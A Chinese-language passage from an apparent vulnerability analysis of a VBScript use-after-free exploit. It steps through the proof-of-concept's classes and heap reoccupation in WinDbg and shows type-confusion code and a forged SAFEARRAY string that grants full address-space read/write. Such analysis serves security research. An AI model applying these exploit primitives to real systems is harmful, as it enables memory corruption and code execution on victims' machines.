    01d823d0  000001a8 00000000 00000000 01d5b9dc
    01d823e0  00000001 00321784 00000000 00000000
    01d823f0  1f487eac 80000000 000000d4 00000000
    01d82400  00000000 00000000 00000000 00000000
    01d82410  00000000 00000000 00000000 00000000
    01d82420  00000000 00000000 1f487e57 80000000
    01d82430  000000db 00000000 00000000 00000000
    0:005> du 321784
    00321784  "cla2"
第四次IsEmpty断点，此时MyClass2_obj2占位已经完成：
此时仍然查看1d82388：
    0:005> g
    Breakpoint 0 hit
    eax=6dd4185c ebx=0257d04c ecx=6dd9a9d8 edx=0257cfc4 esi=01d75424 edi=00000001
    eip=6dd5c206 esp=0257cee0 ebp=0257cef0 iopl=0     nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000246
    vbscript!VbsIsEmpty:
    6dd5c206 8bff       mov   edi,edi
    0:005> dd 1d823c0
    01d823c0  6dd41748 00000002 01d59510 0049ff68 //引用计数为2
    01d823d0  000001a8 00000000 00000000 00000000
    01d823e0  00000000 00321784 00000000 01d82388
    01d823f0  1f487eac 80000000 000000d4 00000000
    01d82400  00000000 00000000 00000000 00000000
    01d82410  00000000 00000000 00000000 00000000
    01d82420  00000000 00000000 1f487e57 80000000
    01d82430  000000db 00000000 00000000 00000000
    0:005> du 321784
    00321784  "cla4" //同样的地址cla4_obj2已经占位
以上就是PoC中的UAF函数所做的事情，接下来来看InitObjects函数。
同样还是再代码里加上了IsEmpty便于调试：
    Sub InitObjects
      'Alert "InitObjects"
      IsEmpty(cla4_obj1)
      cla4_obj1.SetProp(cla6_obj1)        '会调用class6的Get P,完成了string--->array的类型转换
      IsEmpty(cla4_obj1)
      IsEmpty(cla4_obj2)
      cla4_obj2.SetProp(cla7_obj1)        '会调用class7的Get P,完成了string--->long的类型转换
      IsEmpty(cla4_obj2)
    'Alert "InitObjects2"
      spec_int_1=cla4_obj2.mem    '这句将上面指向0000的那个字符串的指针泄露给了spec_int_1
     IsEmpty(spec_int_1)
    End Sub
在执行前我们先来回顾一下cla4_obj1的地址：
    0:005> dd 1d82388
    01d82388  6dd41748 00000002 01d593f0 0049ff68 //cla4_obj1.mem的地址
    01d82398  000001a8 00000000 00000000 00000000
    01d823a8  00000000 002ba02c 00000000 01d82350
    01d823b8  1f487ea5 80000000 000000cd 00000000
    01d823c8  00000000 00000000 00000000 00000000
    01d823d8  00000000 00000000 00000000 00000000
    01d823e8  00000000 00000000 1f487eac 80000000
    01d823f8  000000d4 00000000 00000000 00000000
    0:005> du 2ba02c
002ba02c “cla4” //同样的地址cla4_obj1已经占位
在执行到cla4_obj1.SetProp(cla6_obj1)这里的时候，会去调用cla4的SetProp函数：
    Class cla4
      Dim mem
      Function P
      End Function
      Function SetProp(Value)
        IsEmpty("enter cla4:SetPro")
        mem=0
        mem=Value  '这一步会调用cla6的Get P
        SetProp=0
      End Function
    End Class
在Get P中实现了又一次的占位与一次类型的替换：
    Class cla6
      Public Default Property Get P                'Property Get 语句 用来取得（返回）的值     
        IsEmpty("cal6:call Get P")
        Dim cla5_obj1
            'CDbl是转换成双精度浮点数据类型
            'dd 00000005 00000000 00000000 0000200C
        P=CDbl("174088534690791e-324")            '对cla4_mem赋值，把string改为array类型
        For i=0 To 6            'array_b原本保存了Trigger的引用，而Trigger被释放后是由
          array_b(i)=0        'cla4_obj1占位的。array_b赋值为0，也就是将cla4_obj1的内存释放了
        Next
        IsEmpty("finish set array_b to 0")
        Set cla5_obj1=New cla5        '再次使用悬垂指针重新用cla5_obj1占位，
        cla5_obj1.mem=str_1            '并对cla5.mem赋值伪造的字符串 7fffffff的safearray，
        IsEmpty(cla5_obj1)
        For i=0 To 6
          Set array_b(i)=cla5_obj1
        Next
      End Property
    End Class
重新调试了一遍，现在cla4_obj1地址为25010b8，cla4_obj2地址为25010f0。
现在进入cla6 Get P中的第一个IsEmpty：
    vbscript!VbsIsEmpty:
    6f39c206 8bff       mov   edi,edi
    0:005> dd poi(esp+c)
    0015eed8  00000008 00000000 024f54a0 00000000
    0015eee8  00000000 00000000 00000000 00000000
    0015eef8  00000000 00000000 00000000 00000000
    0015ef08  00000000 00000000 00000000 00000000
    0015ef18  00000000 00000000 00000000 00000000
    0015ef28  00000000 00000000 00000000 00000000
    0015ef38  6f380000 025010f4 0015fdf8 6f384211
    0015ef48  024cc260 0015ef68 025010f0 6f384211
    0:005> du 024f54a0
    024f54a0  "cal6:call Get P"
再进入第二个IsEmpty：
    vbscript!VbsIsEmpty:
    6f39c206 8bff       mov   edi,edi
    0:005> dd poi(esp+c)
    0015eed8  024c0008 024cbf68 024f54fc 0000200c
    0015eee8  024c0002 0015cfd8 02500006 024cbf94
    0015eef8  024c0002 0015cfd8 02500001 024cbf94
    0015ef08  00000000 00000000 00000000 00000000
    0015ef18  00000000 00000000 00000000 00000000
    0015ef28  00000000 00000000 00000000 00000000
    0015ef38  024c0005 024cbf68 00000000 0000200c
    0015ef48  024cc260 0015ef68 025010f0 6f384211
    0:005> du 024f54fc
    024f54fc  "finish set array_b to 0"
现在再来看一下cla4_obj1的占位：
    0:005> dd 25010b8
    025010b8  6f3800d4 00000000 00000000 00000000
    025010c8  00000490 00000000 00000000 00000000
    025010d8  00000000 005b34dc 00000000 00000000
    025010e8  67b123d5 88000000 6f381748 00000001
    025010f8  024d8510 0015e698 00000490 00000000
    02501108  00000000 00000000 00000000 005a55b4
    02501118  00000000 02501080 67b123ec 8c000000
    02501128  6f38ce78 6f393100 6f3930f0 00000002
可以看到原来占位的cla4_obj1内存被释放掉了。
    0:005> !heap -p -a 25010b8
      address 025010b8 found in
      _HEAP @ 150000
       HEAP_ENTRY Size Prev Flags   UserPtr UserSize - state
        025010b0 0007 0000  [00]  025010b8   00030 - (free)
可以看到处于释放状态。
第三次断点，此时再次进行占位，使用的是cla5_obj1：
    //源码
    Set cla5_obj1=New cla5  '再次使用悬垂指针重新用cla5_obj1占位，
        cla5_obj1.mem=str_1  
     IsEmpty(cla5_obj1)
‘这个str1是一个全局变量，
‘str_1=Unescape(“%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000”)
调试可以发现前面被free的地址又被占位了：
    0:005> dd 25010b8
    025010b8  6f381748 00000002 024d83f0 0015e698//24d83f0是cla5.mem的地址
    025010c8  00000490 00000000 00000000 00000000
    025010d8  00000000 005b34dc 00000000 025010f0
    025010e8  67b123d5 88000000 6f381748 00000001
    025010f8  024d8510 0015e698 00000490 00000000
    02501108  00000000 00000000 00000000 005a55b4
    02501118  025010b8 02501080 67b123ec 8c000000
    02501128  6f38ce78 6f393100 6f3930f0 00000002
    0:005> du 5b34dc
    005b34dc  "cla5"
我们再来看一下cla5.mem：
    0:005> dd 024d83f0
    024d83f0  024da7a8 000000b8 00000100 00000100
    024d8400  00004000 024da7ac 024da84c 02502c70
    024d8410  0000000f 00000003 00000040 00000003
    024d8420  00000014 024d8428 024da7ac 024da7f4
    024d8430  024da82c 00750025 00300030 00300030
    024d8440  00750025 00300030 00300030 00750025
    024d8450  00300030 00300030 00000000 024d8784
    024d8460  00010044 70e47cd6 00000000 00000000
    0:005> dd 024da82c 
    024da82c  024d0008 024d87dc 005b34b4 00000000//0x08是类型，代表的vbstring,后面会把这个类型改为safearray即0x200c
    024da83c  00000000 00000000 0000822f 00000006
    024da84c  00000000 00000000 00000003 000005f8
    024da85c  0065006d 0000006d 024da838 00000012
    024da86c  00000000 000005d0 000005f8 00000000
    024da87c  024da7b4 024da84c 0000002b 00000000
    024da88c  000005cb 0000060b 00000000 024da718
    024da89c  024da914 00000002 00000000 000005fa
    //看伪造的这个类似于数组的字符串，它的元素有7fffffff个,每个元素占一字节，元素内存地址为0，那它能访问的内存空间是0-0x7fffffff
    //如果现在类型变为safearray，就能够实现全址读写
    //str_1=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
    0:005> dd 005b34b4
    005b34b4  08800001 00000001 00000000 00000000
    005b34c4  7fffffff 00000000 6f380000 67e6a972